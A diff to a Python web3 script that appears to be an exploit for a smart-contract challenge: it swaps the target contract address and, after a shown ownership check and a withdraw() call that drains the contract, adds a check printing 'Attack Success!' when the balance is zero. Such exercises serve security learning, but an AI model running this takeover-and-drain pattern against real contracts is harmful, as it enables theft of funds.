@@ -16,7 +16,7 @@ dict_output = dotenv_values(ENV_PATH)
 
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
-CONTRACT_ADDRESS = '0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B'
+CONTRACT_ADDRESS = '0xED179b78D5781f93eb169730D8ad1bE7313123F4'
 PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
 web3 = Web3(Web3.HTTPProvider(RPC_URI))
@@ -188,7 +188,7 @@ if AFTER_OWNER != USER_ADDRESS:
 else:
     print("Contract's Owner has changed!\n")
 
-print("Withdraw Contract's balance")
+print("---- WITHDRAW CONTRACT's BALANCE ----")
 
 # 잔액 인출
 tx = contract.functions.withdraw().build_transaction({
@@ -206,3 +206,9 @@ print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
 tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
 print(f"Transaction Receipt: {tx_receipt}")
 
+CONTRACT_BALANCES = web3.eth.get_balance(CONTRACT_ADDRESS)
+
+if CONTRACT_BALANCES == 0:
+    print("Attack Success!")
+else:
+    print("Something Wrong...")
